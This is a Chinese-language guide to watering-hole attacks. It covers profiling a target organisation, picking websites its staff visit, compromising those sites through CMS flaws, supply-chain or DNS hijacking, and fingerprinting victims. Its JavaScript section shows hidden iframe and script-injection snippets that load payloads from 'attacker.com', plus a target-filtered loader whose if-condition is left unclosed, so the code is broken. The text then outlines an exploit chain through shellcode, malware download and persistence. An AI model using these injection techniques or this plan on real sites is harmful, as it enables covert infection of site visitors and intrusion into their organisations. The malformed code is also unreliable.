# 攻击方法论

### 2.1 目标画像

```
目标画像收集:

1. 组织信息
   - 目标组织名称
   - 行业类型
   - 地理位置
   - 组织规模

2. 人员信息
   - 员工列表(LinkedIn等)
   - 职位/角色
   - 技术背景
   - 兴趣爱好

3. 在线行为分析
   - 常访问的网站
   - 社交媒体
   - 专业论坛
   - 行业新闻网站
   - 开发者社区

4. 技术环境
   - 操作系统分布
   - 浏览器类型和版本
   - 补丁状态
   - 安全软件

情报来源:
  - LinkedIn / 企业官网
  - Wayback Machine
  - DNS记录 / 证书透明日志
  - 社交媒体
  - 技术论坛发言
  - 招聘信息(技术栈推断)
```

### 2.2 网站选择

```
网站选择标准:

  1. 目标群体高频访问
     | 行业新闻网站
     | 专业论坛
     | 开发者社区
     | 供应商门户
     | 行业会议网站

  2. 技术可利用性
     | 已知漏洞的CMS
     | 弱管理的服务器
     | 第三方组件漏洞
     | 过时的软件

  3. 访问者过滤
     | 可以区分目标和非目标
     | IP地址/UA/Referer过滤
     | 减少被发现的概率

  4. 信任度高
     | 政府网站
     | 行业协会
     | 知名媒体
     | 目标自身网站

优先级排序:
  P0: 目标员工每天访问的网站
  P1: 目标行业经常访问的网站
  P2: 开发者常用资源站
  P3: 一般性网站(成功率低)
```

### 2.3 漏洞利用与注入

```
入侵网站的方式:

1. 直接入侵
   - 利用CMS漏洞(WordPress/Drupal等)
   - 利用服务器漏洞(已知CVE)
   - 弱密码暴力破解
   - 社会工程学入侵

2. 供应链入侵
   - 入侵网站的第三方组件
   - 广告网络注入
   - CDN劫持
   - DNS劫持

3. 中间人攻击
   - BGP劫持
   - DNS缓存投毒
   - ARP欺骗(局域网)
```

**注入技术**

```javascript

document.write('<iframe src="http://attacker.com/exploit.html" style="display:none"></iframe>');

// 2. 脚本注入(更隐蔽)
var s = document.createElement('script');
s.src = 'https://attacker.com/loader.js';
s.async = true;
document.head.appendChild(s);

// 3. 条件注入(只攻击目标)
// 基于IP/UA/Cookie过滤
if (navigator.userAgent.indexOf('Windows NT 10.0') > -1 &&

    // 只在特定条件下注入
    var s = document.createElement('script');
    s.src = 'https://attacker.com/targeted.js';
    document.head.appendChild(s);
}
```

**漏洞利用链**

```
攻击载荷部署流程:

1. 注入loader脚本(轻量，避免检测)
   |
2. loader检测环境
   | - 浏览器类型和版本
   | - 操作系统
   | - 插件版本(Flash/Java)
   | - 是否为目标(IP/指纹)
   |
3. 选择合适的exploit
   | - 浏览器RCE漏洞
   | - 插件漏洞(Flash等)
   | - 内存破坏漏洞
   |
4. 投递exploit
   | - 执行shellcode
   | - 下载并执行恶意软件
   |
5. 建立持久化
   | - 安装后门
   | - 横向移动
   | - 数据收集
```

### 2.4 受害者追踪

```
攻击者如何确认受害者:

1. IP地址匹配
   - 目标组织的IP段
   - VPN出口IP
   - 办公室公网IP

2. 浏览器指纹
   - User-Agent(含OS版本)
   - Canvas/WebGL指纹
   - 字体列表
   - 插件列表
   - 时区/语言

3. 行为特征
   - 访问路径(从内部系统跳转)
   - Cookie(包含组织信息)
   - Referer头
   - 访问时间(工作时间)

4. 域账户信息
   - NTLM哈希
   - Kerberos票据
   - 浏览器凭据
```
